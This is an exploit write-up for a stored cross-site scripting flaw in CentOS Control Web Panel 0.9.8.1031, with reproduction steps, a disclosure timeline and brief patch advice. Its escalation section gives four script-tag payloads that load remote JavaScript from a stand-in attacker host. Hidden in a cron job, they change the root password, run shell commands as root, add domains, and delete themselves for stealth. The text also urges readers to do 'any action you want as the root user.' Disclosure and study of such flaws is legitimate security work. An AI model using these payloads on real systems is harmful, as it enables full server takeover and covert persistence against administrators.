Exploiting an XSS vulnerability in the CWP control panel and escalating the attack to change the root password...

# Information

```
# Exploit Title       : CWP (CentOS Control Web Panel) Version 0.9.8.1031 - XSS to full root takeover
# Date                : 7 january 2021
# Exploit Author      : Chokri B.A.
# Vendor Homepage     : https://control-webpanel.com/
# Software Link       : http://centos-webpanel.com/demo/
# Version             : 0.9.8.1031
# Tested on           : CentOS 7 / CentOS 6
# CVE                 : #
```

# Description
A simple user can add/delete/modify any option on behalf of the root user, and even change the root's password via a stored XSS vulnerability.

#  Steps to Reproduce
1. Login into the CentOS Web Panel using user credential
2. Create a new cron job using your prefered XSS payload.
3. Login as root and navigate to the list of cronjobs
4. the XSS payload will get executed.

#  Escalating
I've created 2 examples on how you can escalate this attack to take control of the full server.

1. <b>PayloadAddDomain.js</b> : add this code as your cronjob, when the root user list the cronjobs, a new domain name will be added under the choosen user.
``` 
<script type="text/javascript" src="https://yourevilwebsite.tld/PayloadAddDomain.js"></script>
```


2. <b>PayloadChangeRootPass.js</b> add this code as your cronjob, when the root user list the cronjobs, you will be able to change to root's password and take control of the full server.
``` 
<script type="text/javascript" src="https://yourevilwebsite.tld/PayloadChangeRootPass.js"></script>
```

3. <b>PayloadExecCmd.js</b> add this code as your cronjob, when the root user list the cronjobs, you will be able to execute any shell command as the root user, you can create a new user with root privileges for examples ;)
``` 
<script type="text/javascript" src="https://yourevilwebsite.tld/PayloadExecCmd.js"></script>
```
4. <b>PayloadRemoveCron.js</b> add this code as your cronjob, when the root user list the cronjobs, the malicious code will be removed automatically from the cronjob's list. you can conbine this code wity any of the other codes to execute whatever you want and delete the XSS payload to be more stealthy.
``` 
<script type="text/javascript" src="https://yourevilwebsite.tld/PayloadRemoveCron.js"></script>
```

5. You can perform any action you want as the root user. The only limit is your imagination....

#  Solution - Fix & Patch
The vulnerability can be patched by a secure parse and encode of the vulnerable input fields.
Disallow usage of special chars and restrict the parameter input to prevent application-side script code injection attacks.
Filter in the output error or the item listing the vulnerable location were the code executes.


#  Timeline

```
2021-01-07: Discovered the bug
2021-01-08: Reported to vendor
2021-01-13: Vender accepted the vulnerability
2021-02-10: The vulnerability has been fixed
2021-02-13: Published
```

#  Demo
[![Video Demo](https://img.youtube.com/vi/5i30nfXxEc0/0.jpg)](https://www.youtube.com/watch?v=5i30nfXxEc0)
